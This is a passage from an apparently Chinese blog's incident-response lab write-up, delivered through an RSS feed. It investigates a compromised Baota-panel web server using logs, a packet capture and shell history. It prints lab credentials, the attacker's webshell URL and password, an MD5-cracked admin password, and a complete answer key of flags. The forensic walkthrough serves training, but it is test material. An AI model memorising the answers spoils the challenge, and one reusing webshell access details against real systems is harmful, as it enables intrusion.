&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">外网面板地址&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//58.247.126.6:12485/5a2ce72d&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">内网面板地址&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//192.168.198.130:12485/5a2ce72d&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">username&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">uysycv5w&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">password&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">admin123&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">进行登录&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015356.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015404.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">我们从bt面板里面看到了他添加了一个网站&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">我们去看一下他的日志&lt;/span>&lt;span class="err">（&lt;/span>&lt;span class="nx">这里我就不用宝塔面板中的去查看日志了&lt;/span>&lt;span class="err">），&lt;/span>&lt;span class="nx">我们首先去&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wwwlogs目录下127&lt;/span>&lt;span class="mf">.0.0.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span> &lt;span class="nx">查看一下日志&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用命令&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">cat&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">gerp&lt;/span> &lt;span class="mi">200&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015419.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="mf">192.168.20.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="2-提交攻击者修改的管理员密码明文">2. 提交攻击者修改的管理员密码(明文)&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">在宝塔面板发现一个phpmyadmin的mysql数据库&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">进管理看数据&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">找密码即可&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015432.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">找到一个x2_user表&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">密码&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">这里使用过的是md5进行加密的&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">不清楚的可以去网上搜一下或者看一下源码&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">md5加密是不可逆的&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">但是可以在网上公开的网站进行解密&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">URL&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//www.somd5.com/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mi">2020&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015447.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015502.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mi">2020&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="3-提交第一次webshell的连接url">3. 提交第一次Webshell的连接URL&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">查看流量包&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">可以看出&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">app&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">register&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015513.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Webshell的连接&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//192.168.198.130/index.php?user-app-register&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="4-提交webshell连接密码">4. 提交Webshell连接密码&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">根据题目3可以看出&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015530.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">webshell密码是&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Network2020&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用蚁剑进行连接&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015548.png" alt="image.png">&lt;/p>
&lt;h1 id="5-提交数据包的flag1">5. 提交数据包的flag1&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ls一下&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">你就会发现默认的文件夹下给了一个流量数据包&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">下载这个数据包使用wireshark进行分析&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">web&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span> &lt;span class="p">~]&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">anaconda&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ks&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">cfg&lt;/span> &lt;span class="nx">wp&lt;/span> &lt;span class="nx">数据包1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pcapng&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015601.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">首先&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">过滤一下http报文&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">可以看到这些报文都是攻击者192&lt;/span>&lt;span class="mf">.168.20.1&lt;/span>&lt;span class="nx">在访问Linux主机&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015612.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">先浏览一下过滤出来的报文&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">发现攻击者访问了&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">flag1路径&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">追踪http流&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015622.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">发现了一个第一个flag&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag1&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">_2020_Hack&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">提交判题程序得知正确&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015637.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag1&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">_2020_Hack&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="6-提交攻击者使用的后续上传的木马文件名称">6. 提交攻击者使用的后续上传的木马文件名称&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">查看数据包&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">可以看出&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">黑客上传了一个version2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php文件&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015650.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">version2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="7-提交攻击者隐藏的flag2">7. 提交攻击者隐藏的flag2&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">根据命令可以看出&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">黑客进入了127&lt;/span>&lt;span class="mf">.0.0.1&lt;/span>&lt;span class="nx">文件夹&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">并创建了一个隐藏文件夹&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">api&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">进入后查看&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015702.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">可以看出他编辑了这两个文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">cat看一下&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015711.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cat&lt;/span> &lt;span class="nx">alinotify&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">发现flag2&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015724.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：$&lt;/span>&lt;span class="nx">flag2&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s">&amp;#34;flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="8-提交攻击者隐藏的flag3">8. 提交攻击者隐藏的flag3&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用命令&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">history&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">查看历史使用过的命令可以发现&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015740.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="全部答案">全部答案：&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.20.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mi">2020&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//192.168.198.130/index.php?user-app-register&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Network2020&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag1&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Network&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">_2020_Hack&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">version2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item></channel></rss>